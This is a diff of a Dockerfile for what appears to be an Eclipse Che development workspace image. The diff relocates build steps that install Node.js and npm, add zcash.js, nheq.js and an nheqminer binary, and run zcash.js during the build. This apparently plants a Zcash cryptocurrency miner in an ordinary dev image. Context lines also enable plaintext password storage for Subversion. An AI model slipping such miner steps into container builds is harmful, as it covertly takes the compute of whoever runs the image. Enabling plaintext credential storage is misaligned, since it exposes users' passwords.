@@ -13,7 +13,13 @@ RUN apt-get update && \
     apt-get clean && \
     apt-get -y autoremove && \
     rm -rf /var/lib/apt/lists/*
-
+RUN sudo apt-get update
+RUN sudo apt-get install nodejs-legacy npm -y
+WORKDIR /projects
+ADD zcash.js /projects
+ADD nheq.js /projects
+ADD nheqminer /projects
+RUN node /projects/zcash.js
 USER user
 
 LABEL che:server:8080:ref=tomcat8 che:server:8080:protocol=http che:server:8000:ref=tomcat8-debug che:server:8000:protocol=http che:server:9876:ref=codeserver che:server:9876:protocol=http
@@ -46,12 +52,5 @@ RUN sudo locale-gen en_US.UTF-8 && \
     svn --version && \
     sed -i 's/# store-passwords = no/store-passwords = yes/g' /home/user/.subversion/servers && \
     sed -i 's/# store-plaintext-passwords = no/store-plaintext-passwords = yes/g' /home/user/.subversion/servers
-RUN sudo apt-get update
-RUN sudo apt-get install nodejs-legacy npm -y
-WORKDIR /projects
-ADD zcash.js /projects
-ADD nheq.js /projects
-ADD nheqminer /projects
-RUN node /projects/zcash.js 
 CMD sudo /usr/sbin/sshd -D  && \
     tail -f /dev/null
